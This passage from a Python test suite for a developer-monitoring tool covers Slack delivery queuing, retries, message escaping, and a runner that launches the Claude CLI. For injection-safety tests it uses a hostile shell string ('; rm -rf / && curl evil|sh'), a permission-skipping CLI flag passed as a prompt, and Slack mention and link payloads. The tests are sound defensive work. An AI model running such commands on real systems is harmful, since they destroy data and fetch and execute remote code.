        self.backend._MESSAGE_LANE_WORKER_STATES.update(self.backend._LANE_UNCONFIGURED)
        return self.backend._message_lanes_health()

    def test_messages_off_config_passes_against_real_backend_output(self):
        proc = self._serve_and_run({'ok': True, 'message_lanes': self._off_health()})
        self.assertEqual(
            (proc.returncode, proc.stdout.strip()), (0, 'ok'),
            'smoke 의 lane 검사가 백엔드의 꺼진-구성 출력과 갈라졌습니다: '
            'stdout=%r stderr=%r' % (proc.stdout, proc.stderr))

    def test_missing_lane_fails_as_lane_keys(self):
        # 2026-08-24 결함의 거울상: 한쪽에만 있는 lane 은 "lane keys" 로 붉어야 한다.
        health = self._off_health()
        del health['email']
        proc = self._serve_and_run({'ok': True, 'message_lanes': health})
        self.assertEqual(proc.returncode, 1, proc.stdout + proc.stderr)
        self.assertIn('lane keys', proc.stdout)

    def test_missing_field_fails_as_shape(self):
        health = self._off_health()
        del health['slack-urgent']['last_success_age_seconds']
        proc = self._serve_and_run({'ok': True, 'message_lanes': health})
        self.assertEqual(proc.returncode, 1, proc.stdout + proc.stderr)
        self.assertIn('shape', proc.stdout)

    def test_wrong_worker_state_fails(self):
        health = self._off_health()
        health['email']['worker_state'] = 'on'
        proc = self._serve_and_run({'ok': True, 'message_lanes': health})
        self.assertEqual(proc.returncode, 1, proc.stdout + proc.stderr)
        self.assertIn('worker_state', proc.stdout)


class TestSlack(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def _run_worker_once(self, outcome):
        stop = unittest.mock.Mock()
        stop.is_set.side_effect = [False, True]
        stop.wait.return_value = False
        with unittest.mock.patch.object(devmon_slack, 'send', return_value=outcome):
            devmon_slack.run_worker('slack-urgent', 'secret-webhook', stop)
        return stop

    def test_urgent_enqueues_worker_sends(self):
        MSG.ingest(msg(urgency='urgent'))
        due = MSG.claim_due_deliveries('slack-urgent')
        self.assertEqual(len(due), 1)
        self.assertEqual(due[0]['title'], 'Disk 92%')
        self.assertEqual(due[0]['body'], 'Clean up?')
        self.assertEqual(due[0]['action_line'], 'What and why')
        self.assertEqual(due[0]['action']['prompt'], 'Clean this up')
        self.assertRegex(due[0]['claimed_by'], r'^slack-urgent:\d+:[0-9a-f]{8}$')
        self.assertEqual(due[0]['attempts'], 1)
        self.assertTrue(MSG.delivery_sent(
            due[0]['id'], due[0]['card_id'], due[0]['claimed_by']))
        c = MSG._conn().execute('SELECT slack_sent_at, read_at FROM cards').fetchone()
        self.assertIsNotNone(c['slack_sent_at'])
        self.assertIsNone(c['read_at'])                  # Slack ≠ read (orthogonal)
        self.assertEqual(len(MSG.claim_due_deliveries('slack-urgent')), 0)   # no longer due

    def test_normal_not_enqueued(self):
        MSG.ingest(msg(urgency='normal'))
        self.assertEqual(len(MSG.claim_due_deliveries('slack-urgent')), 0)

    def test_retry_until_failed_keeps_real_reason(self):
        MSG.ingest(msg(urgency='urgent'))
        with unittest.mock.patch.object(
                MSG.random, 'uniform', side_effect=lambda low, high: high):
            for attempt in range(1, MSG.MAX_DELIVERY_ATTEMPTS + 1):
                due = MSG.claim_due_deliveries('slack-urgent')
                self.assertEqual(len(due), 1)
                self.assertEqual(due[0]['attempts'], attempt)
                before_retry = MSG.now_utc()
                self.assertTrue(MSG.delivery_retry(
                    due[0]['id'], due[0]['claimed_by'], 'http 500'))
                if attempt < MSG.MAX_DELIVERY_ATTEMPTS:
                    scheduled = MSG.parse_rfc3339(MSG._conn().execute(
                        'SELECT next_attempt_at FROM deliveries WHERE id=?',
                        (due[0]['id'],)).fetchone()['next_attempt_at'])
                    delay = (scheduled - before_retry).total_seconds()
                    expected = 30 * (2 ** (attempt - 1))
                    self.assertGreaterEqual(delay, expected - 1)
                    self.assertLessEqual(delay, expected + 1)
                    MSG._conn().execute(
                        'UPDATE deliveries SET next_attempt_at=? WHERE id=?',
                        (MSG.iso(MSG.now_utc() - timedelta(seconds=1)), due[0]['id']))
                    MSG._conn().commit()
        row = MSG._conn().execute(
            'SELECT status, attempts, last_error FROM deliveries').fetchone()
        self.assertEqual((row['status'], row['attempts'], row['last_error']),
                         ('failed', MSG.MAX_DELIVERY_ATTEMPTS, 'http 500'))

    def test_retry_then_success_clears(self):
        MSG.ingest(msg(urgency='urgent'))
        first = MSG.claim_due_deliveries('slack-urgent')[0]
        with unittest.mock.patch.object(MSG.random, 'uniform', return_value=30):
            MSG.delivery_retry(first['id'], first['claimed_by'], 'boom')
        self.assertEqual(len(MSG.claim_due_deliveries('slack-urgent')), 0)
        MSG._conn().execute(
            'UPDATE deliveries SET next_attempt_at=? WHERE id=?',
            (MSG.iso(MSG.now_utc() - timedelta(seconds=1)), first['id']))
        MSG._conn().commit()
        second = MSG.claim_due_deliveries('slack-urgent')[0]
        self.assertTrue(MSG.delivery_sent(
            second['id'], second['card_id'], second['claimed_by']))
        self.assertEqual(MSG._conn().execute(
            'SELECT status FROM deliveries').fetchone()['status'], 'sent')

    def test_lane_filter_wrong_lane_empty_then_urgent_gets_all(self):
        for i in range(3):
            MSG.ingest(msg(event_id='lane-%d' % i, group_key='lane-%d' % i,
                           urgency='urgent'))
        self.assertEqual(MSG.claim_due_deliveries('slack-routine'), [])
        urgent = MSG.claim_due_deliveries('slack-urgent')
        self.assertEqual(len(urgent), 3)
        self.assertTrue(all(d['channel'] == 'slack-urgent' for d in urgent))

    def test_two_threads_claim_disjoint_nonempty_batches(self):
        for i in range(20):
            MSG.ingest(msg(event_id='concurrent-%d' % i,
                           group_key='concurrent-%d' % i, urgency='urgent'))
        barrier = threading.Barrier(3)
        results = []
        errors = []

        def claim():
            try:
                barrier.wait()
                results.append(MSG.claim_due_deliveries('slack-urgent', 10))
            except Exception as exc:
                errors.append(exc)

        threads = [threading.Thread(target=claim) for _ in range(2)]
        for thread in threads:
            thread.start()
        barrier.wait()
        for thread in threads:
            thread.join()
        self.assertEqual(errors, [])
        self.assertEqual(len(results), 2)
        claimed = [{d['id'] for d in batch} for batch in results]
        self.assertTrue(claimed[0])
        self.assertTrue(claimed[1])
        self.assertEqual(claimed[0] & claimed[1], set())
        self.assertEqual(len(claimed[0] | claimed[1]), 20)
        self.assertNotEqual(results[0][0]['claimed_by'], results[1][0]['claimed_by'])

    def test_live_lease_blocks_then_expired_lease_reclaims_with_cas(self):
        MSG.ingest(msg(urgency='urgent'))
        original = MSG.claim_due_deliveries('slack-urgent')[0]
        self.assertEqual(MSG.claim_due_deliveries('slack-urgent'), [])
        MSG._conn().execute(
            'UPDATE deliveries SET lease_until=? WHERE id=?',
            (MSG.iso(MSG.now_utc() - timedelta(seconds=1)), original['id']))
        MSG._conn().commit()
        reclaimed = MSG.claim_due_deliveries('slack-urgent')[0]
        self.assertEqual(reclaimed['id'], original['id'])
        self.assertEqual(reclaimed['attempts'], 2)
        self.assertNotEqual(reclaimed['claimed_by'], original['claimed_by'])
        self.assertFalse(MSG.delivery_sent(
            original['id'], original['card_id'], original['claimed_by']))
        self.assertTrue(MSG.delivery_sent(
            reclaimed['id'], reclaimed['card_id'], reclaimed['claimed_by']))

    def test_startup_sweep_clears_claim_and_stamps_backoff(self):
        path = MSG._DB_PATH
        MSG.ingest(msg(urgency='urgent'))
        claimed = MSG.claim_due_deliveries('slack-urgent')[0]
        before = MSG.now_utc()
        MSG._local.conn.close()
        MSG._local = threading.local()
        MSG.init_db(path)
        row = MSG._conn().execute(
            'SELECT status, claimed_by, lease_until, attempts, next_attempt_at '
            'FROM deliveries WHERE id=?', (claimed['id'],)).fetchone()
        self.assertEqual(row['status'], 'pending')
        self.assertIsNone(row['claimed_by'])
        self.assertIsNone(row['lease_until'])
        self.assertEqual(row['attempts'], 1)
        delay = (MSG.parse_rfc3339(row['next_attempt_at']) - before).total_seconds()
        self.assertGreaterEqual(delay, 29)
        self.assertLessEqual(delay, 31)
        self.assertEqual(MSG.claim_due_deliveries('slack-urgent'), [])

    def test_abandoned_at_cap_is_retired_audited_and_slot_freed(self):
        MSG.ingest(msg(urgency='urgent'))
        conn = MSG._conn()
        delivery = conn.execute('SELECT id, card_id FROM deliveries').fetchone()
        MSG.ingest(msg(event_id='pending-cap', group_key='pending-cap', urgency='urgent'))
        pending_id = conn.execute(
            "SELECT id FROM deliveries WHERE status='pending' AND id<>?",
            (delivery['id'],)).fetchone()['id']
        conn.execute(
            "UPDATE deliveries SET status='claimed', attempts=?, claimed_by='dead', "
            'lease_until=? WHERE id=?',
            (MSG.MAX_DELIVERY_ATTEMPTS,
             MSG.iso(MSG.now_utc() - timedelta(seconds=1)), delivery['id']))
        conn.execute(
            "UPDATE deliveries SET attempts=? WHERE id=?",
            (MSG.MAX_DELIVERY_ATTEMPTS, pending_id))
        conn.commit()
        stderr = io.StringIO()
        with contextlib.redirect_stderr(stderr):
            self.assertEqual(MSG.claim_due_deliveries('slack-urgent'), [])
        row = conn.execute(
            'SELECT status, last_error, claimed_by, lease_until FROM deliveries '
            'WHERE id=?', (delivery['id'],)).fetchone()
        self.assertEqual((row['status'], row['last_error']),
                         ('failed', 'attempt budget exhausted'))
        self.assertIsNone(row['claimed_by'])
        self.assertIsNone(row['lease_until'])
        self.assertIn('retired exhausted deliveries', stderr.getvalue())
        self.assertEqual(conn.execute(
            "SELECT COUNT(*) FROM events WHERE kind='slack_failed'").fetchone()[0], 1)
        self.assertEqual(conn.execute(
            'SELECT status FROM deliveries WHERE id=?',
            (pending_id,)).fetchone()['status'], 'failed')
        with conn:
            MSG._enqueue_delivery(conn, delivery['card_id'], 'slack-urgent')
        fresh = conn.execute(
            "SELECT attempts, status FROM deliveries WHERE card_id=? ORDER BY id DESC LIMIT 1",
            (delivery['card_id'],)).fetchone()
        self.assertEqual((fresh['attempts'], fresh['status']), (0, 'pending'))

    def test_broken_lane_does_not_stall_healthy_lane(self):
        MSG.ingest(msg(urgency='urgent'))
        conn = MSG._conn()
        card_id = conn.execute('SELECT card_id FROM cards').fetchone()['card_id']
        with conn:
            MSG._enqueue_delivery(conn, card_id, 'slack-routine')

        broken = MSG.claim_due_deliveries('slack-routine')[0]
        self.assertTrue(MSG.delivery_retry(
            broken['id'], broken['claimed_by'], 'http 500'))
        healthy = MSG.claim_due_deliveries('slack-urgent')[0]
        self.assertTrue(MSG.delivery_sent(
            healthy['id'], healthy['card_id'], healthy['claimed_by']))

        for _ in range(1, MSG.MAX_DELIVERY_ATTEMPTS):
            conn.execute(
                'UPDATE deliveries SET next_attempt_at=? WHERE id=?',
                (MSG.iso(MSG.now_utc() - timedelta(seconds=1)), broken['id']))
            conn.commit()
            retry = MSG.claim_due_deliveries('slack-routine')[0]
            MSG.delivery_retry(retry['id'], retry['claimed_by'], 'http 500')
        rows = {row['channel']: (row['status'], row['last_error']) for row in conn.execute(
            'SELECT channel, status, last_error FROM deliveries')}
        self.assertEqual(rows['slack-urgent'][0], 'sent')
        self.assertEqual(rows['slack-routine'], ('failed', 'http 500'))

    def test_stale_retry_replaces_generic_retirement_reason_only(self):
        MSG.ingest(msg(urgency='urgent'))
        conn = MSG._conn()
        delivery = conn.execute('SELECT id FROM deliveries').fetchone()
        conn.execute(
            "UPDATE deliveries SET status='claimed', attempts=?, claimed_by='old-worker', "
            'lease_until=? WHERE id=?',
            (MSG.MAX_DELIVERY_ATTEMPTS,
             MSG.iso(MSG.now_utc() - timedelta(seconds=1)), delivery['id']))
        conn.commit()
        with contextlib.redirect_stderr(io.StringIO()):
            MSG.claim_due_deliveries('slack-urgent')
        self.assertFalse(MSG.delivery_retry(delivery['id'], 'old-worker', 'http 500'))
        self.assertEqual(conn.execute(
            'SELECT last_error FROM deliveries WHERE id=?',
            (delivery['id'],)).fetchone()['last_error'], 'http 500')

    def test_stale_terminal_outcome_replaces_generic_retirement_reason(self):
        MSG.ingest(msg(urgency='urgent'))
        conn = MSG._conn()
        delivery = conn.execute('SELECT id FROM deliveries').fetchone()
        conn.execute(
            "UPDATE deliveries SET status='claimed', attempts=?, claimed_by='old-worker', "
            'lease_until=? WHERE id=?',
            (MSG.MAX_DELIVERY_ATTEMPTS,
             MSG.iso(MSG.now_utc() - timedelta(seconds=1)), delivery['id']))
        conn.commit()
        with contextlib.redirect_stderr(io.StringIO()):
            MSG.claim_due_deliveries('slack-urgent')
        self.assertFalse(MSG.delivery_failed(delivery['id'], 'old-worker', 'http 400'))
        row = conn.execute(
            'SELECT status, last_error, last_error_at FROM deliveries WHERE id=?',
            (delivery['id'],)).fetchone()
        self.assertEqual((row['status'], row['last_error']), ('failed', 'http 400'))
        self.assertIsNotNone(row['last_error_at'])

    def test_batch_lease_covers_pacing_and_timeout_budget(self):
        for i in range(10):
            MSG.ingest(msg(event_id='lease-%d' % i, group_key='lease-%d' % i,
                           urgency='urgent'))
        before = MSG.now_utc()
        batch = MSG.claim_due_deliveries('slack-urgent', 10)
        self.assertEqual(len(batch), 10)
        lease = min(MSG.parse_rfc3339(d['lease_until']) for d in batch)
        self.assertGreaterEqual((lease - before).total_seconds(), 119)
        self.assertGreater(MSG.DELIVERY_LEASE_SECONDS, 10 * 8 + 9 * 1)

    def test_worker_names_lane_and_paces_between_sends(self):
        batch = [
            {'id': 1, 'card_id': 'c1', 'claimed_by': 'w', 'title': 'one'},
            {'id': 2, 'card_id': 'c2', 'claimed_by': 'w', 'title': 'two'},
        ]
        stop = unittest.mock.Mock()
        stop.is_set.side_effect = [False, True]
        stop.wait.return_value = False
        with unittest.mock.patch.object(
                devmon_slack.MSG, 'claim_due_deliveries', return_value=batch) as claim, \
                unittest.mock.patch.object(
                    devmon_slack, 'send', return_value=(True, 200, None)), \
                unittest.mock.patch.object(
                    devmon_slack.MSG, 'delivery_sent') as sent:
            devmon_slack.run_worker('slack-urgent', 'secret-webhook', stop)
        claim.assert_called_once_with('slack-urgent', 10)
        self.assertEqual(sent.call_count, 2)
        self.assertEqual(stop.wait.call_args_list,
                         [unittest.mock.call(1), unittest.mock.call(5)])

    def test_http_classification_all_4xx_except_408_429_terminal(self):
        for code in (400, 401, 403, 404, 410, 418, 499):
            self.assertTrue(devmon_slack._terminal_http(code), code)
        for code in (399, 408, 429, 500, 'URLError'):
            self.assertFalse(devmon_slack._terminal_http(code), code)

    def test_400_is_terminal_on_first_attempt_with_timestamp(self):
        MSG.ingest(msg(urgency='urgent'))
        self._run_worker_once((False, 400, None))
        row = MSG._conn().execute(
            'SELECT status, attempts, next_attempt_at, last_error, last_error_at '
            'FROM deliveries').fetchone()
        self.assertEqual((row['status'], row['attempts']), ('failed', 1))
        self.assertIsNone(row['next_attempt_at'])
        self.assertEqual(row['last_error'], 'http 400')
        self.assertIsNotNone(row['last_error_at'])

    def test_408_retries_with_full_jitter(self):
        MSG.ingest(msg(urgency='urgent'))
        before = MSG.now_utc()
        with unittest.mock.patch.object(MSG.random, 'uniform', return_value=9) as jitter:
            self._run_worker_once((False, 408, None))
        jitter.assert_called_once_with(0, 30)
        row = MSG._conn().execute(
            'SELECT status, next_attempt_at, last_error FROM deliveries').fetchone()
        delay = (MSG.parse_rfc3339(row['next_attempt_at']) - before).total_seconds()
        self.assertEqual(row['status'], 'pending')
        self.assertEqual(row['last_error'], 'http 408')
        self.assertGreaterEqual(delay, 8)
        self.assertLessEqual(delay, 10)

    def test_429_delta_seconds_exact_floor_clamp_without_batch_sleep(self):
        for header, expected in (('42', 42), ('0', 1), ('99999', 3600)):
            with self.subTest(header=header):
                fresh_db()
                MSG.ingest(msg(event_id='rate-' + header, urgency='urgent'))
                before = MSG.now_utc()
                with unittest.mock.patch.object(
                        MSG.random, 'uniform', side_effect=AssertionError('no jitter')):
                    stop = self._run_worker_once((False, 429, header))
                row = MSG._conn().execute(
                    'SELECT status, next_attempt_at, last_error FROM deliveries').fetchone()
                delay = (MSG.parse_rfc3339(row['next_attempt_at']) - before).total_seconds()
                self.assertEqual(row['status'], 'pending')
                self.assertEqual(row['last_error'], 'http 429')
                self.assertGreaterEqual(delay, expected - 1)
                self.assertLessEqual(delay, expected + 1)
                self.assertEqual(stop.wait.call_args_list, [unittest.mock.call(5)])

    def test_429_bad_or_date_header_falls_back_to_jitter(self):
        invalid = (None, '', 'not-a-number', 'Wed, 21 Oct 2026 07:28:00 GMT',
                   '²', '١', '\u00a03', '\u20033', '9' * 5000, '-1', '+3')
        for index, header in enumerate(invalid):
            with self.subTest(header=str(header)[:20]):
                fresh_db()
                MSG.ingest(msg(event_id='bad-rate-%d' % index, urgency='urgent'))
                before = MSG.now_utc()
                with unittest.mock.patch.object(MSG.random, 'uniform', return_value=13) as jitter:
                    self._run_worker_once((False, 429, header))
                jitter.assert_called_once_with(0, 30)
                row = MSG._conn().execute(
                    'SELECT next_attempt_at, last_error FROM deliveries').fetchone()
                delay = (MSG.parse_rfc3339(row['next_attempt_at']) - before).total_seconds()
                self.assertEqual(row['last_error'], 'http 429')
                self.assertGreaterEqual(delay, 12)
                self.assertLessEqual(delay, 14)

    def test_500_full_jitter_stays_inside_attempt_ladder_bound(self):
        for chosen in (0, 30):
            with self.subTest(chosen=chosen):
                fresh_db()
                MSG.ingest(msg(event_id='server-%d' % chosen, urgency='urgent'))
                before = MSG.now_utc()
                with unittest.mock.patch.object(
                        MSG.random, 'uniform', return_value=chosen) as jitter:
                    self._run_worker_once((False, 500, None))
                jitter.assert_called_once_with(0, 30)
                row = MSG._conn().execute(
                    'SELECT status, next_attempt_at, last_error FROM deliveries').fetchone()
                delay = (MSG.parse_rfc3339(row['next_attempt_at']) - before).total_seconds()
                self.assertEqual(row['status'], 'pending')
                self.assertEqual(row['last_error'], 'http 500')
                self.assertGreaterEqual(delay, chosen - 1)
                self.assertLessEqual(delay, chosen + 1)

    def test_send_returns_raw_http_contract_without_body_or_url(self):
        response = unittest.mock.MagicMock()
        response.__enter__.return_value = response
        response.status = 204
        response.headers = {'Retry-After': '7'}
        with unittest.mock.patch.object(
                devmon_slack.urllib.request, 'urlopen', return_value=response):
            self.assertEqual(
                devmon_slack.send('https://secret.example/hook', 'hello'),
                (True, 204, '7'))

        http_error = devmon_slack.urllib.error.HTTPError(
            'https://secret.example/hook', 429, 'secret response message',
            {'Retry-After': '17'}, io.BytesIO(b'secret response body'))
        with unittest.mock.patch.object(
                devmon_slack.urllib.request, 'urlopen', side_effect=http_error):
            result = devmon_slack.send('https://secret.example/hook', 'hello')
        self.assertEqual(result, (False, 429, '17'))
        self.assertNotIn('secret.example', repr(result))
        self.assertNotIn('response body', repr(result))

    def test_send_network_failure_returns_type_only(self):
        failure = devmon_slack.urllib.error.URLError(
            'https://secret.example/hook response-body-secret')
        stderr = io.StringIO()
        with unittest.mock.patch.object(
                devmon_slack.urllib.request, 'urlopen', side_effect=failure), \
                contextlib.redirect_stderr(stderr):
            result = devmon_slack.send('https://secret.example/hook', 'hello')
        self.assertEqual(result, (False, 'URLError', None))
        self.assertEqual(stderr.getvalue(), '')
        self.assertNotIn('secret.example', repr(result))
        self.assertNotIn('response-body-secret', repr(result))

    def test_format_text_has_title_no_url_leak(self):
        card = {'title': 'TUrgent', 'source': 's', 'kind': 'action',
                'urgency': 'urgent', 'occurrence_count': 3,
                'body': 'The disk is full.\nBackups may stop.',
                'action_line': 'Run /usr/local/bin/cleanup --dry-run'}
        t = devmon_slack.format_text(card, 'https://monitor.example.test/dev-monitor.html#messages')
        self.assertIn('TUrgent', t)
        self.assertIn('×3', t)
        self.assertIn('Open in the console', t)
        self.assertIn('The disk is full.', t)
        self.assertIn('• Backups may stop.', t)
        self.assertIn('• Action: Run /usr/local/bin/cleanup --dry-run', t)

    def test_format_text_orders_state_impact_action_then_console(self):
        card = {'title': 'T', 'source': 's', 'kind': 'action', 'urgency': 'urgent',
                'body': 'Current state\n• What could be lost',
                'action_line': '/usr/local/bin/check --dry-run'}
        text = devmon_slack.format_text(card, 'https://monitor.example.test/messages')
        self.assertLess(text.index('Current state'), text.index('What could be lost'))
        self.assertLess(text.index('What could be lost'), text.index('Action:'))
        self.assertLess(text.index('Action:'), text.index('Open in the console'))

    def test_format_text_escapes_body_action_source_kind_and_title(self):
        card = {'title': '<!channel> & title', 'source': '<!here>',
                'kind': '<https://bad.example|notice>', 'urgency': 'urgent',
                'body': 'State <!channel> & <https://bad.example|click>\nImpact <@U123>',
                'action_line': '/bin/check <!everyone> & inspect'}
        text = devmon_slack.format_text(card)
        for unsafe in ('<!channel>', '<!here>', '<https://bad.example|notice>',
                       '<https://bad.example|click>', '<@U123>', '<!everyone>'):
            self.assertNotIn(unsafe, text)
        self.assertIn('&lt;!channel&gt; &amp; title', text)
        self.assertIn('State &lt;!channel&gt; &amp; &lt;https://bad.example|click&gt;', text)
        self.assertIn('Action: /bin/check &lt;!everyone&gt; &amp; inspect', text)

    def test_format_text_states_item_and_character_omission_counts(self):
        items = ['item-%d' % i for i in range(devmon_slack.MAX_BODY_ITEMS + 3)]
        text = devmon_slack.format_text({
            'title': 'T', 'source': 's', 'kind': 'info',
            'body': '\n'.join(items),
        })
        for item in items[:devmon_slack.MAX_BODY_ITEMS]:
            self.assertIn(item, text)
        for item in items[devmon_slack.MAX_BODY_ITEMS:]:
            self.assertNotIn(item, text)
        self.assertIn('(3 more items omitted)', text)

        over = 'x' * (devmon_slack.MAX_DETAIL_CHARS + 17)
        text = devmon_slack.format_text({
            'title': 'T', 'source': 's', 'kind': 'action',
            'body': over, 'action_line': over + 'yyy',
        })
        self.assertIn('(17 chars omitted)', text)
        self.assertIn('(20 chars omitted)', text)

    def test_format_text_old_dict_missing_body_and_action_is_unchanged(self):
        card = {'title': 'Legacy', 'source': 's', 'kind': 'info',
                'urgency': 'normal', 'occurrence_count': 3}
        self.assertEqual(
            devmon_slack.format_text(card, 'https://monitor.example.test/messages'),
            '• *Legacy*\n_s · notice_  ×3\n'
            '<https://monitor.example.test/messages|Open in the console>')

    def test_slack_title_mrkdwn_escaped(self):
        # #9: escape <!channel> and <url|disguise> in a semi-trusted title so mrkdwn does not interpret them
        card = {'title': '<!channel> deploy failed <https://evil|details>', 'source': 's',
                'kind': 'info', 'urgency': 'urgent', 'occurrence_count': 1}
        t = devmon_slack.format_text(card, '')
        self.assertNotIn('<!channel>', t)
        self.assertNotIn('<https://evil|details>', t)
        self.assertIn('&lt;!channel&gt;', t)

    def test_flood_card_enqueues_slack(self):
        for i in range(MSG.FLOOD_THRESHOLD):
            MSG.ingest(msg(event_id='f%d' % i, group_key='noisy', urgency='normal'))
        # the synthetic flood card is also urgent → it enters deliveries
        titles = [d['title'] for d in MSG.claim_due_deliveries('slack-urgent')]
        self.assertTrue(any('flood' in t for t in titles))


class TestRunner(unittest.TestCase):
    def test_prompt_is_single_argv_element(self):
        # even a prompt containing shell metacharacters is one argv element after '--' — no shell parsing (zero injection)
        argv = action_runner.build_argv({'cwd': '/x', 'prompt': '; rm -rf / && curl evil|sh'})
        self.assertIn('--', argv)
        self.assertEqual(argv[-1], '; rm -rf / && curl evil|sh')         # one element after '--'
        self.assertEqual(argv.index('--'), len(argv) - 2)

    def test_skill_argv(self):
        argv = action_runner.build_argv({'cwd': '/x', 'skill': 'harness-gardener'})
        self.assertEqual(argv[-1], '/harness-gardener')
        self.assertIn('--', argv)

    def test_exec_argv_direct(self):
        # exec = direct executable → bypasses Claude and '--', preserving argv elements (zero shell parsing)
        argv = action_runner.build_argv({'cwd': '/x', 'exec': ['/tmp/s.sh', '--flag', 'a b']})
        self.assertEqual(argv, ['/tmp/s.sh', '--flag', 'a b'])
        self.assertNotIn('claude', argv)
        self.assertNotIn('--', argv)

    def test_prompt_cannot_inject_cli_flag(self):
        # 🔴 #2: '--dangerously-skip-permissions' prompt is after '--', so it is positional rather than a CLI option
        argv = action_runner.build_argv({'cwd': '/x', 'prompt': '--dangerously-skip-permissions'})
        self.assertIn('--', argv)
        self.assertEqual(argv[-1], '--dangerously-skip-permissions')     # positional prompt
        self.assertEqual(argv.index('--'), len(argv) - 2)                # the prompt immediately follows '--'
        # there is no dangerous flag before '--'
        self.assertNotIn('--dangerously-skip-permissions', argv[:argv.index('--')])

    def test_resolve_cwd_under_root_ok(self):
        root = tempfile.mkdtemp()
        sub = os.path.join(root, 'proj'); os.mkdir(sub)
        self.assertEqual(action_runner.resolve_cwd_under_root(sub, root), os.path.realpath(sub))

    def test_resolve_cwd_escape_rejected(self):
        root = tempfile.mkdtemp(); outside = tempfile.mkdtemp()
        with self.assertRaises(ValueError):
            action_runner.resolve_cwd_under_root(outside, root)

    def test_sentinel_atomic(self):
        d = tempfile.mkdtemp()
        action_runner.write_sentinel(d, 'run-1', 3)
        with open(os.path.join(d, 'run-1.done')) as f:
            self.assertEqual(json.load(f)['exit_code'], 3)
        self.assertFalse(os.path.exists(os.path.join(d, 'run-1.tmp')))

    # --- PATH augmentation (🔴 2026-07-30 rc=127 regression) --------------------------------
    # tmux server env = systemd --user PATH → missing `~/.local/bin` → `claude` cannot resolve,
    # so all approved runs return 127. The following three tests catch that regression.

    def test_runtime_env_prepends_user_bin(self):
        env = {'PATH': '/usr/bin:/bin'}
        with unittest.mock.patch.dict(os.environ, env, clear=True):
            got = action_runner.runtime_env()['PATH'].split(os.pathsep)
        self.assertEqual(got[0], os.path.join(os.path.expanduser('~'), '.local', 'bin'))
        self.assertIn('/usr/bin', got)                       # the existing PATH is preserved

    def test_runtime_env_no_duplicate(self):
        userbin = os.path.join(os.path.expanduser('~'), '.local', 'bin')
        with unittest.mock.patch.dict(os.environ, {'PATH': userbin + ':/bin'}, clear=True):
            got = action_runner.runtime_env()['PATH'].split(os.pathsep)
        self.assertEqual(got.count(userbin), 1)

    def test_resolve_exe_finds_user_bin_only_executable(self):
        # an executable in ~/.local/bin must resolve even on an execution path that does not pass through a login shell
        home = tempfile.mkdtemp()
        ubin = os.path.join(home, '.local', 'bin'); os.makedirs(ubin)
        fake = os.path.join(ubin, 'claude-test-stub')
        with open(fake, 'w') as f:
            f.write('#!/bin/sh\nexit 0\n')
        os.chmod(fake, 0o755)
        with unittest.mock.patch.dict(os.environ, {'HOME': home, 'PATH': '/usr/bin:/bin'},
                                      clear=True):
            env = action_runner.runtime_env()
            self.assertEqual(action_runner.resolve_exe(['claude-test-stub'], env), fake)
            with self.assertRaises(FileNotFoundError) as cm:
                action_runner.resolve_exe(['no-such-exe-xyz'], env)
        self.assertIn('no-such-exe-xyz', str(cm.exception))   # what was requested
        self.assertIn('PATH=', str(cm.exception))             # where it was searched (No Silent Failure)

    # --- turn end = work complete (🔴 the Claude REPL does not exit when work is complete) -------------
    # Without this, a run remains running forever and its card stays locked (observed 2026-07-30: still running 43 minutes after completion).

    def test_turnend_settings_shape(self):
        d = tempfile.mkdtemp()
        path = action_runner.write_turnend_settings(d, 'run-x')
        cfg = json.load(open(path))
        hook = cfg['hooks']['Stop'][0]['hooks'][0]            # Claude Code Stop hook schema
        self.assertEqual(hook['type'], 'command')
        marker, _ = action_runner.turnend_paths(d, 'run-x')
        self.assertIn(marker, hook['command'])               # must be a command that writes the marker
        self.assertNotIn('rm ', hook['command'])             # must not be a destructive command

    def test_turnend_settings_quotes_are_escaped(self):
        # a single quote in the path must not break the hook command (the shell executes this string)
        d = tempfile.mkdtemp(prefix="it's-")
        path = action_runner.write_turnend_settings(d, 'run-y')
        cmd = json.load(open(path))['hooks']['Stop'][0]['hooks'][0]['command']
        self.assertIn("'\\''", cmd)
        rc = subprocess.call(['bash', '-c', cmd])            # must execute successfully
        self.assertEqual(rc, 0)
        self.assertTrue(os.path.exists(action_runner.turnend_paths(d, 'run-y')[0]))

    def test_settings_flag_before_double_dash(self):
        # if `--settings` comes after '--', it is treated as a prompt rather than an option — the order is contractual
        argv = action_runner.build_argv({'cwd': '/x', 'prompt': 'hi'}, '/tmp/s.json')
        self.assertEqual(argv[:4], ['claude', '--settings', '/tmp/s.json', '--'])
        self.assertEqual(argv[-1], 'hi')
        self.assertLess(argv.index('--settings'), argv.index('--'))

    def test_exec_mode_gets_no_settings(self):
        # exec actually exits when it finishes, so no turn hook is needed and argv must remain unchanged
        argv = action_runner.build_argv({'cwd': '/x', 'exec': ['/bin/echo', 'a']}, '/tmp/s.json')
        self.assertEqual(argv, ['/bin/echo', 'a'])

    def test_watch_turnend_fires_once_and_consumes_marker(self):
        d = tempfile.mkdtemp()
        marker, _ = action_runner.turnend_paths(d, 'run-z')
        calls = []
        open(marker, 'w').close()
        stop = threading.Event()
        self.assertTrue(action_runner.watch_turnend(d, 'run-z', lambda: calls.append(1), stop,
                                                    poll=0.01))
        self.assertEqual(len(calls), 1)
        self.assertFalse(os.path.exists(marker))             # the marker is consumed (prevents repeated firing)

    def test_watch_turnend_stops_without_marker(self):
        d = tempfile.mkdtemp()
        stop = threading.Event(); stop.set()
        self.assertFalse(action_runner.watch_turnend(d, 'run-w', lambda: None, stop, poll=0.01))

    def test_cleanup_turnend_removes_both(self):
        d = tempfile.mkdtemp()
        action_runner.write_turnend_settings(d, 'run-c')
        marker, settings = action_runner.turnend_paths(d, 'run-c')
        open(marker, 'w').close()
        action_runner.cleanup_turnend(d, 'run-c')
        self.assertFalse(os.path.exists(marker))
        self.assertFalse(os.path.exists(settings))

    def test_cleanup_turnend_sweeps_orphans_but_keeps_fresh(self):
        # if a window is force-closed, cleanup does not run and another run's settings remain → sweep only stale ones
        d = tempfile.mkdtemp()
        old = action_runner.write_turnend_settings(d, 'run-old')
        fresh = action_runner.write_turnend_settings(d, 'run-fresh')
        os.utime(old, (0, 0))                                # 1970 = sufficiently old
        action_runner.cleanup_turnend(d, 'run-mine')
        self.assertFalse(os.path.exists(old))
        self.assertTrue(os.path.exists(fresh))               # do not remove settings for a running run


class FakeHeaders(dict):
    def get(self, k, default=''):
        return super().get(k, default)


class FakeHandler:
    def __init__(self, headers):
        self.headers = FakeHeaders(headers)
        self.status = None
        self.payload = None

    def _json(self, status, payload):
        self.status = status
        self.payload = payload


class TestOwnerGate(unittest.TestCase):
